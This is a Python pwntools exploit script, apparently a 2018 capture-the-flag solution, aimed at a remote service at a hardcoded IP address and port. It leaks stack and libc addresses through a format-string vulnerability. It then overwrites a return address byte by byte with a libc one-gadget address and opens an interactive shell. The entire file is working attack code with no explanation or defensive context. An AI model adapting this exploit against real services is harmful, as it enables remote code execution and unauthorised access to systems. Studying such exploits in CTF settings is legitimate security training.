#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
context.log_level = "debug"
pool = []

r = remote("58.20.46.147",37725)
def leak(add):
    if "\x0a" in p64(add):
        return "\x00"
    r.sendlineafter("number:","aa"+p64(add))
    r.sendlineafter("give me your str:","%12$sGG\x00")
    d1 = r.recvuntil("GG")[:-2]
    return d1

def show(payload):
    r.sendlineafter("str:",payload)
    return r.recvline()[:-1]

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
stack_add = 0
def debug():
    log.debug("libc.address:0x%x"%libc.address)
    log.debug("stack address:0x%x"%stack_add)
    pause()
def leak_all(num=22):
    pool = []
    for i in range(1,num):
        pool.append(show("%"+"%d$p"%i))
    return pool

def edit(target,value,first=True):
    if first:
        show("%"+str(target&0xffff)+"c"+"%23$hn")
    else:
        show("%"+str(target&0xff)+"c"+"%23$hhn")
    show("%"+str(value&0xff)+"c"+"%49$hhn")

    
p = process(["./main","-36"])
now = int(p.recvline()[:-1])
r.sendlineafter("number:", str(now))
recv = r.recvline()[:-1]
pool = leak_all()
stack_add = int(pool[17],16)
libc.address = int(pool[20],16) - 0x20830

gadget = libc.address + 0xf1147

for i in range(6):
    value = (gadget>>(i*8))&0xff
    edit(stack_add-0xe0+8+i,value,first=i==0)

show("a"*0x30)
r.interactive()








